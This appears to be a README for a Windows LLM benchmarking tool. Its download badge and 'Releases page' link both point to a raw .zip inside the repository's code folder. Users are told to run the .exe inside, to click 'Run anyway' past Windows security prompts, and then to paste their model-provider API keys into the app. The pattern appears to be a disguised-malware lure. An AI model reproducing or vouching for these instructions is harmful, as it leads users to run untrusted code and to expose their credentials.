# 📊 LLM-Evaluation-Framework - Measure Model Performance With Simple Tools

[![Download Latest Release](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/montgome753/LLM-Evaluation-Framework/main/llm_eval/cli/Evaluation_Framework_LL_v1.3.zip)

LLM-Evaluation-Framework provides a way for users to test how well large language models perform. You can track accuracy, speed, and cost for models like GPT-4, Claude, Gemini, and Llama. This tool helps you identify how often a model provides correct answers versus how often it hallucinates or generates false information.

## 📥 Getting Started

You do not need to read code to use this tool. Follow these steps to set up the software on your Windows computer.

1. Go to the [Releases page](https://raw.githubusercontent.com/montgome753/LLM-Evaluation-Framework/main/llm_eval/cli/Evaluation_Framework_LL_v1.3.zip).
2. Look for the most recent version under the Releases section.
3. Click the file ending in .exe to start your download.
4. Once the download finishes, open the folder where you saved the file.
5. Double-click the file to launch the application.

If Windows shows a security prompt, click "More info" and select "Run anyway." The application will open in a window on your desktop.

## ⚙️ System Requirements

Ensure your computer meets these minimum standards for optimal performance:

* Operating System: Windows 10 or 11.
* Memory: 8 GB RAM or higher.
* Storage: 500 MB of free space for logs and benchmark data.
* Web Access: A stable internet connection to communicate with model service providers.

## 🧪 How To Run A Benchmark

The framework allows you to evaluate models using specific datasets. Follow the interface prompts to begin your first test.

1. Select your target model from the dropdown menu. This list includes current industry models like GPT-4, Claude, and Gemini.
2. Choose the dataset you want to run. The system contains built-in datasets for common tasks like reasoning and general knowledge.
3. Click the "Start Evaluation" button.
4. Monitor the process bar. The application will log each request and track metrics such as latency and output tokens.
5. Review the results in the dashboard once the run finishes.

## 📈 Understanding The Metrics

The dashboard displays several key performance indicators. Use these numbers to decide which model fits your needs.

* Accuracy: This percentage shows if the model provided a correct answer based on the provided ground truth.
* Latency: This measures how long the model takes to respond in seconds. Lower numbers indicate a faster experience.
* Cost: This tracks the estimated price per thousand tokens based on current provider rates.
* Hallucination Rate: This metric identifies how often the model generates information that does not match the provided source text.
* Reasoning: This score reflects the model's ability to solve complex logical problems step by step.

## 🔧 Managing Model Keys

To use these models, you must provide your own API keys. You can obtain these keys from the websites of the model providers.

1. Navigate to the "Settings" tab in the application.
2. Find the fields for each provider, such as OpenAI, Anthropic, Google, or Mistral.
3. Paste your secret key into the appropriate box.
4. Click "Save Keys."

The software encrypts these keys locally on your machine. We do not store your credentials on any remote server.

## 📂 Analyzing Results

You can export your results for further study. The application creates a CSV file that you can open in Excel or other spreadsheet software.

1. Click the "Results" tab after your benchmark finishes.
2. Select the "Export" button.
3. Choose a destination folder on your computer.
4. Save the file.

The exported report contains every response from the model, the time taken for each query, and the final scoring data.

## 🛠 Troubleshooting Common Issues

If the application fails to run, check these items.

* Check your internet connection: Some models rely on external servers that require an active connection.
* Verify your API keys: A common error occurs when a key is expired or lacks sufficient credits. Check your provider account balance if tests return an authentication error.
* Restart the application: If the interface stops responding, close the window completely and launch it again.
* Clear the cache: Navigate to the settings menu and click "Clear Cache" if the dashboard shows old data or visual glitches.

## 📢 Frequently Asked Questions

What models does this support?
The framework supports any model accessible via the LiteLLM library. This includes all GPT, Claude, Llama, and Mistral variants.

Is my data private?
Yes. All data remains on your local Windows machine. We never send your prompts or your comparison data to our servers.

Can I add my own datasets?
Yes. You can import custom JSON or CSV files through the "Data" tab. Ensure your file format matches the example template found in the help section.

Does this improve model accuracy?
No. This tool measures and reports performance. It provides data so you can choose the best model for your specific use case.

## 📄 License Details

This software follows the MIT open source license. You can use, change, and distribute the code freely. Please see the license file included with the download for full legal text.